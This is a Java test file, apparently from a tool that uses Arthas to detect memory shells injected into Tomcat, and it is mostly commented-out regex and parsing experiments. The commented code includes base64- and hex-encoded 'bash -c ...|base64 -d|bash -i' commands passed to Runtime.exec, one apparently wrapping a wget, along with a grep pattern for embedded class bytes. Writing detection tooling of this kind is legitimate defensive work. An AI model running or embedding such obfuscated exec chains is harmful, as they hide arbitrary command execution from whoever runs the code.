package com.kmba;

import com.kmba.Utils.ArthasWsClient;

import java.lang.reflect.Field;

import static com.kmba.Utils.Dict.*;

public class TestMain {
    public static void main(String[] args) {

//            AgentInfo agentInfo = new AgentInfo();
//            agentInfo.setHost("127.0.0.1");
//            agentInfo.setWsPort(8563);
//            ArthasWsWrapper wrapper = new ArthasWsWrapper(agentInfo);
//            ArthasWsClient client = wrapper.createArthasWsClient();
//            client.send(JSON.toJSONString(new ArthasWsRequest("help")));
//            Thread.sleep(500);
//
//            pollForResult(client);
////
//            System.out.println(client.resultMsg);
//            Iterator iterator = client.resultMsg.iterator();
//            while (iterator.hasNext()) {
//                System.out.println(iterator.next());
//            }

//            System.out.println(new Util().getTomcatSiteCnt());

// Listener正则测试
//            String text = "@CopyOnWriteArrayList[\n" +
//                    "@EvilListener[com.InjectListener$1EvilListener@4cf75d37],\n" +
//                    "]";
//            System.out.println(text);
//            String regex = "@\\w+\\[([\\w.$]+)@[0-9a-f]{8}\\]";
//            Pattern pattern = Pattern.compile(regex);
//            Matcher matcher = pattern.matcher(text);
//        System.out.println(matcher);
//            while (matcher.find()) {
//                String className = matcher.group(1);
//                // 避免重复添加
//                System.out.println(className);
//
//            }
//            System.out.println("end");
        // Servlet 正则测试
//        String text = "@HashMap[\n" +
//                "    @String[/injectWS]:@String[com.InjectWebsocket],\n" +
//                "    @String[*.jsp]:@String[jsp],\n" +
//                "    @String[/injectLister]:@String[com.InjectListener],\n" +
//                "    @String[/injectExecutor]:@String[com.InjectExecutor],\n" +
//                "    @String[/checkListener]:@String[com.DeleteListener],\n" +
//                "    @String[/index]:@String[com.Index],\n" +
//                "    @String[/check]:@String[com.DeleteFilter],\n" +
//                "    @String[/injectThread]:@String[com.InjectThread],\n" +
//                "    @String[/]:@String[default],\n" +
//                "    @String[*.jspx]:@String[jsp],\n" +
//                "    @String[/injectFilter]:@String[com.InjectFilter],\n" +
//                "    @String[/injectServlet]:@String[com.InjectServlet],\n" +
//                "    @String[/injectTimer]:@String[com.InjectTimer],\n" +
//                "    @String[/checkServlet]:@String[com.DeleteServlet],\n" +
//                "    @String[/injectAgentServlet]:@String[com.AgentInject.InjectAgentServlet],\n" +
//                "    @String[/injectUpgrade]:@String[com.InjectUpgrade],\n" +
//                "    @String[/injectValve]:@String[com.InjectValve],\n" +
//                "]";
//
//        String regex = "@String\\[(.*?)\\]:@String\\[(.*?)\\]";
//        Pattern pattern = Pattern.compile(regex);
//        Matcher matcher = pattern.matcher(text);
//
//        JSONArray jsonArray = new JSONArray();
//
//        while (matcher.find()) {
//            String url = matcher.group(1);      // 第一个捕获组：URL
//            String className = matcher.group(2); // 第二个捕获组：类名
//
//            // 创建JSON对象存储键值对
//            System.out.println(url+ ":" + className);
//        }
//        String input = "@NonLoginAuthenticator[org.apache.catalina.authenticator.NonLoginAuthenticator[/servletDemo_war_exploded]]";
//
//        // 正则表达式：匹配类名（包含包路径）
//        String regex = "\\[([^\\[\\/]+)\\[";
//
//        Pattern pattern = Pattern.compile(regex);
//        Matcher matcher = pattern.matcher(input);
//
//        System.out.println("找到的类名：");
//        while (matcher.find()) {
//            // 获取完整的匹配
//            String fullMatch = matcher.group(1);
//            System.out.println(matcher);
//            // 获取类名部分
////            String className = matcher.group(2);
//
////            System.out.println("完整匹配: " + fullMatch);
////            System.out.println("类名: " + className);
////            System.out.println("---");
//        }

//        String result = "@String[http-nio-8082-AsyncTimeout:org.apache.coyote.AbstractProtocol$AsyncTimeout@4fec20ca]";
//        String regex = "\\@String\\[(.*?)\\:([0-9a-zA-Z.$_]+)\\]";
//        Pattern pattern = Pattern.compile(regex);
//        Matcher matcher = pattern.matcher(result);
//
//        while (matcher.find()) {
//            System.out.println(matcher.group(1) + " : " +matcher.group(2));
//        }
//        ArthasWsWrapper wrapper = ArthasWsWrapper.getWrapper();
//        Path path = Paths.get("/Users/y1shin/Tomcat/apache-tomcat-8.5.84/bin/1.txt");
//
//        try (BufferedReader br = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {
//            // 初始化
//            wrapper.runCmd("help");
//            String line;
//            while ((line = br.readLine()) != null) {
////                line = "javax.servlet.http.HttpServlet";
//                String cmd = String.format("jad --source-only --lineNumber false %s | grep 'yv66vgAAA'",line);
//
//                List<String> result = wrapper.runCmd0(cmd);
//                if (!(result.isEmpty() || result == null)) {
//                    System.out.println(result);
//                }
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        ArthasWsWrapper wrapper = ArthasWsWrapper.getWrapper();
//        try {
//            Thread.sleep(500);
//        } catch (InterruptedException e) {
//            throw new RuntimeException(e);
//        }
//        String cmd = "jad --source-only --lineNumber false javax.servlet.http.HttpServlet";
//        System.out.println(cmd);
//
//        try{
//            // 初始化，防止初始化的输出进到执行中
//            wrapper.runCmd0("help");
//            int cnt = Util.getTomcatSiteCnt();
//            List<String> result = wrapper.runCmd0(cmd);
//            System.out.println(String.join("" ,result));
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }


//            ArthasWsWrapper client = ArthasWsWrapper.getWrapper();
//            System.out.println(client.runCmd("help"));

//        String base = "YmFzaCAtYyB7ZWNobyxZMkZzWXc9PX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9";
//        try {
//
//            java.lang.Runtime.getRuntime().exec(new java.lang.String(java.util.Base64.getDecoder().decode(base)));
//        } catch (IOException e) {
//            throw new RuntimeException(e);
//        }
//        String hex = "62617368202d63207b6563686f2c6432646c6443414d6a4d6c4e4175374d6a4d6c4e413234366d47633559634751694c6d4775696f7d7c7b6261736536342c2d647d7c7b626173682c2d697d";
//        BigInteger x = new java.math.BigInteger(hex ,16);
//        System.out.println(x.toByteArray());
//        System.out.println(javax.xml.bind.DatatypeConverter.parseBase64Binary(base));
//        try {
//            Method m = base.getClass().getDeclaredMethod("toString");
////            String.class.getDeclaredConstructor().setAccessible();
//
//            m.setAccessible(true);
//            try {
//                m.invoke(base);
//            } catch (IllegalAccessException e) {
//                throw new RuntimeException(e);
//            } catch (InvocationTargetException e) {
//                throw new RuntimeException(e);
//            }
//
//
//        } catch (NoSuchMethodException e) {
//            throw new RuntimeException(e);
//        }

//        String x = "class-info        ognl.ASTSequence                                                                                                                                  \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.ASTSequence                                                                                                                                  \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       ASTSequence                                                                                                                                       \n" +
//                " modifier          public                                                                                                                                            \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces        ognl.NodeType,ognl.enhance.OrderedReturn                                                                                                          \n" +
//                " super-class       +-ognl.SimpleNode                                                                                                                                 \n" +
//                "                     +-java.lang.Object                                                                                                                              \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@76a7f310                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   76a7f310                                                                                                                                          \n" +
//                "\n" +
//                " class-info        ognl.ASTSequence                                                                                                                                  \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.ASTSequence                                                                                                                                  \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       ASTSequence                                                                                                                                       \n" +
//                " modifier          public                                                                                                                                            \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces        ognl.NodeType,ognl.enhance.OrderedReturn                                                                                                          \n" +
//                " super-class       +-ognl.SimpleNode                                                                                                                                 \n" +
//                "                     +-java.lang.Object                                                                                                                              \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@5cc957fa                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   5cc957fa                                                                                                                                          \n" +
//                "\n" +
//                " class-info        ognl.ASTTest                                                                                                                                      \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.ASTTest                                                                                                                                      \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       ASTTest                                                                                                                                           \n" +
//                " modifier          public                                                                                                                                            \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces                                                                                                                                                          \n" +
//                " super-class       +-ognl.ExpressionNode                                                                                                                             \n" +
//                "                     +-ognl.SimpleNode                                                                                                                               \n" +
//                "                       +-java.lang.Object                                                                                                                            \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@76a7f310                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   76a7f310                                                                                                                                          \n" +
//                "\n" +
//                " class-info        ognl.ASTTest                                                                                                                                      \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.ASTTest                                                                                                                                      \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       ASTTest                                                                                                                                           \n" +
//                " modifier          public                                                                                                                                            \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces                                                                                                                                                          \n" +
//                " super-class       +-ognl.ExpressionNode                                                                                                                             \n" +
//                "                     +-ognl.SimpleNode                                                                                                                               \n" +
//                "                       +-java.lang.Object                                                                                                                            \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@5cc957fa                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   5cc957fa                                                                                                                                          \n" +
//                "\n" +
//                " class-info        ognl.ASTVarRef                                                                                                                                    \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.ASTVarRef                                                                                                                                    \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       ASTVarRef                                                                                                                                         \n" +
//                " modifier          public                                                                                                                                            \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces        ognl.NodeType,ognl.enhance.OrderedReturn                                                                                                          \n" +
//                " super-class       +-ognl.SimpleNode                                                                                                                                 \n" +
//                "                     +-java.lang.Object                                                                                                                              \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@76a7f310                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   76a7f310                                                                                                                                          \n" +
//                "\n" +
//                " class-info        ognl.ASTVarRef                                                                                                                                    \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.ASTVarRef                                                                                                                                    \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       ASTVarRef                                                                                                                                         \n" +
//                " modifier          public                                                                                                                                            \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces        ognl.NodeType,ognl.enhance.OrderedReturn                                                                                                          \n" +
//                " super-class       +-ognl.SimpleNode                                                                                                                                 \n" +
//                "                     +-java.lang.Object                                                                                                                              \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@5cc957fa                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   5cc957fa                                                                                                                                          \n" +
//                "\n" +
//                " class-info        ognl.ExpressionNode                                                                                                                               \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.ExpressionNode                                                                                                                               \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       ExpressionNode                                                                                                                                    \n" +
//                " modifier          abstract,public                                                                                                                                   \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces                                                                                                                                                          \n" +
//                " super-class       +-ognl.SimpleNode                                                                                                                                 \n" +
//                "                     +-java.lang.Object                                                                                                                              \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@76a7f310                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   76a7f310                                                                                                                                          \n" +
//                "\n" +
//                " class-info        ognl.ExpressionNode                                                                                                                               \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.ExpressionNode                                                                                                                               \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       ExpressionNode                                                                                                                                    \n" +
//                " modifier          abstract,public                                                                                                                                   \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces                                                                                                                                                          \n" +
//                " super-class       +-ognl.SimpleNode                                                                                                                                 \n" +
//                "                     +-java.lang.Object                                                                                                                              \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@5cc957fa                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   5cc957fa                                                                                                                                          \n" +
//                "\n" +
//                " class-info        ognl.SimpleNode                                                                                                                                   \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.SimpleNode                                                                                                                                   \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       SimpleNode                                                                                                                                        \n" +
//                " modifier          abstract,public                                                                                                                                   \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces        ognl.Node,java.io.Serializable                                                                                                                    \n" +
//                " super-class       +-java.lang.Object                                                                                                                                \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@5cc957fa                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   5cc957fa                                                                                                                                          \n" +
//                "\n" +
//                " class-info        ognl.SimpleNode                                                                                                                                   \n" +
//                " code-source       /Users/y1shin/.arthas/lib/4.1.5/arthas/arthas-core.jar                                                                                            \n" +
//                " name              ognl.SimpleNode                                                                                                                                   \n" +
//                " isInterface       false                                                                                                                                             \n" +
//                " isAnnotation      false                                                                                                                                             \n" +
//                " isEnum            false                                                                                                                                             \n" +
//                " isAnonymousClass  false                                                                                                                                             \n" +
//                " isArray           false                                                                                                                                             \n" +
//                " isLocalClass      false                                                                                                                                             \n" +
//                " isMemberClass     false                                                                                                                                             \n" +
//                " isPrimitive       false                                                                                                                                             \n" +
//                " isSynthetic       false                                                                                                                                             \n" +
//                " simple-name       SimpleNode                                                                                                                                        \n" +
//                " modifier          abstract,public                                                                                                                                   \n" +
//                " annotation                                                                                                                                                          \n" +
//                " interfaces        ognl.Node,java.io.Serializable                                                                                                                    \n" +
//                " super-class       +-java.lang.Object                                                                                                                                \n" +
//                " class-loader      +-com.taobao.arthas.agent.ArthasClassloader@76a7f310                                                                                              \n" +
//                "                     +-sun.misc.Launcher$ExtClassLoader@5c29bfd                                                                                                      \n" +
//                " classLoaderHash   76a7f310   ";
//
//        String[] classBlocks = x.split("\n\\s*\n");
//        JSONArray result = new JSONArray();
//        for (String block : classBlocks) {
//            if (block.trim().isEmpty()) {
//                continue;
//            }
//
//            JSONObject classInfo = new JSONObject();
//            String[] lines = block.split("\n");
//
//            String currentClassInfo = null;
//            String currentClassLoaderHash = null;
//
//            for (String line : lines) {
//                line = line.trim();
//                if (line.isEmpty()) {
//                    continue;
//                }
//
//                // 提取 class-info
//                if (line.startsWith("class-info")) {
//                    currentClassInfo = line.substring("class-info".length()).trim();
//                    classInfo.put("class-info", currentClassInfo);
//                }
//
//                // 提取 classLoaderHash
//                if (line.startsWith("classLoaderHash")) {
//                    currentClassLoaderHash = line.substring("classLoaderHash".length()).trim();
//                    classInfo.put("classLoaderHash", currentClassLoaderHash);
//                }
//            }
//
//            // 只有当同时有 class-info 和 classLoaderHash 时才添加
//            if (classInfo.containsKey("class-info") && classInfo.containsKey("classLoaderHash")) {
//                result.add(classInfo);
//            }
//        }
//        System.out.println(result);
//        Socket socket = new Socket();
//        try {
//            socket.connect(new InetSocketAddress("127.0.0.1", 9900));
//        } catch (IOException e) {
//            throw new RuntimeException(e);
//        }
        String a = new String("123");
        try {
            Field f = a.getClass().getDeclaredField("hash");
//            f.setAccessible();
//            f.set
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        }

//        Runtime x = Runtime.getRuntime();
//        x.class.getDeclared


    }


    // 轮询命令执行是否结束
    public static void pollForResult(ArthasWsClient client) {
        int pollCount = 0;
        boolean isEnd = false;

        while (pollCount < MAX_POLL_COUNT) {
            try {
                if (client.end) {
                    isEnd = true;
                    break;
                }

                Thread.sleep(POLL_INTERVAL_MS);
                pollCount++;

            } catch (InterruptedException e) {
                System.err.println("轮询被中断");
            }
        }
    }
}
